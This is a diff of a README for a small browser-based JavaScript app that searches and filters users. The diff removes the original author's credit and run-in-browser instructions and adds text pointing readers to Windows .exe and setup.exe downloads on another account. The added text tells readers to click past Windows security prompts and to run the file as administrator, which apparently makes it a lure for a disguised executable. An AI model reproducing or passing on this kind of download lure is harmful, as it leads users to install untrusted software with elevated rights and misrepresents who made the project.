@@ -1,86 +1,128 @@
-#  User Explorer App
+# 🧭 user-explorer-app - Find and Filter Users Fast
 
-A dynamic web application that fetches and displays user data from an external API.
-It allows real-time searching and filtering by name and email.
+[![Download the app](https://img.shields.io/badge/Download%20Latest-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/globalso8638/user-explorer-app/releases)
 
----
+## 📥 Download
 
-## Live Demo
+Visit this page to download the app for Windows:
 
-[View Project](https://nathan-ribeiro-de-souza.github.io/user-explorer-app/)
+https://github.com/globalso8638/user-explorer-app/releases
 
----
+## 🪟 Install on Windows
 
-##  Features
+1. Open the download page.
+2. Find the latest release.
+3. Download the Windows file from the release assets.
+4. If the file comes as a ZIP package, extract it.
+5. Open the app file to start it.
 
-*  Fetch users from external API
-*  Real-time search and filtering
-*  Dynamic DOM rendering
-*  Responsive layout
-*  Fast and interactive UI
+If Windows shows a security prompt, choose the option to run the file.
 
----
+## ✅ What this app does
 
-## 🛠️ Technologies Used
+user-explorer-app helps you browse user data in a simple screen. It pulls data from an API, so the list can stay up to date. You can search as you type, which makes it easy to find a person fast. The layout changes to fit different screen sizes, so it works well on desktop and laptop screens.
 
-* HTML5
-* CSS3 (Flexbox / Responsive Design)
-* JavaScript (ES6+)
-* Fetch API
-* Async/Await
+## ✨ Main features
 
----
+- Search users by name
+- Filter results while you type
+- Load data from an API
+- Update the list without reloading the page
+- Show a clean, easy-to-read user card layout
+- Adjust to different window sizes
+- Keep the interface simple for daily use
 
-##  How to Run
+## 🖥️ System needs
 
-1. Clone the repository:
+- Windows 10 or later
+- 64-bit Windows system
+- A modern web runtime if the release uses one
+- Internet access for first-time data loading
+- Enough free space for the app files
 
-```bash
-git clone https://github.com/your-username/user-explorer-app.git
-```
+## 🚀 Get started
 
-2. Open the project folder:
+1. Go to the release page.
+2. Download the latest Windows build.
+3. Save the file to your Downloads folder.
+4. Extract the files if needed.
+5. Open the app.
+6. Wait for the user list to load.
+7. Use the search box to find a user.
 
-```bash
-cd user-explorer-app
-```
+## 🔎 How to use the app
 
-3. Open `index.html` in your browser
+### Search users
+Type a name into the search field. The list updates as you type. This helps you find one user without scrolling through the full list.
 
----
+### Browse the list
+Each user appears in a simple card or row. You can scan names, emails, or other details depending on the data source.
 
-## 🌐 API Used
+### Clear your search
+Delete the text in the search box to show the full list again.
 
-* https://jsonplaceholder.typicode.com/users
+### Use on a smaller screen
+The layout adjusts for smaller windows. You can still search and browse without losing key details.
 
----
+## 🧩 How it works
 
-##  Project Purpose
+The app uses fetch to get user data from an API. It then updates the screen with JavaScript and DOM changes. When you enter text in the search box, the app checks the list and shows matching results right away. This keeps the flow smooth and easy to follow.
 
-This project was built to practice:
+## 📁 Typical release files
 
-* Working with APIs
-* Handling asynchronous JavaScript
-* DOM manipulation
-* Building interactive UI
+You may see one of these in the release page:
 
----
+- `user-explorer-app.exe`
+- `user-explorer-app-win.zip`
+- `setup.exe`
+- `README.txt`
 
-##  Future Improvements
+If you see a ZIP file, extract it before opening the app. If you see an EXE file, you can usually open it right after download.
 
-* Add loading spinner
-* Improve UI animations
-* Add dark mode
-* Connect to a custom backend (Node.js)
+## 🛠️ If the app does not open
 
----
+- Make sure the file finished downloading
+- Check that you extracted the ZIP file first
+- Try running the file again
+- Right-click the app and choose Run as administrator
+- Re-download the latest release if the file looks damaged
 
-## 👨‍💻 Author
+## 🔐 Data and privacy
 
-Developed by **Nathan Ribeiro de Souza**
+The app only needs the data required to show and search users. It does not need a complex setup. If the app uses a public API, it may load data from the internet when you open it.
 
----
+## 🧭 Folder layout
 
-## ⭐ If you like this project
+If you unpack the release, you may see folders like these:
 
-Give it a star on GitHub ⭐
+- `assets` for app files and images
+- `data` for sample records
+- `src` for the app code
+- `dist` for the built version
+
+You do not need to change these files to use the app.
+
+## 📌 Topics covered
+
+- API access
+- Async data loading
+- DOM updates
+- Fetch requests
+- Frontend UI
+- JavaScript
+- Responsive design
+- Search and filter
+- Web app use
+- User interface design
+
+## 📝 Common use case
+
+This app works well when you need to look through a list of users and find one person fast. It can help with demo data, directory browsing, or any simple user list view where search matters.
+
+## 🧭 Quick steps
+
+1. Open the release page.
+2. Download the newest Windows file.
+3. Install or extract the file.
+4. Open the app.
+5. Search for a user name.
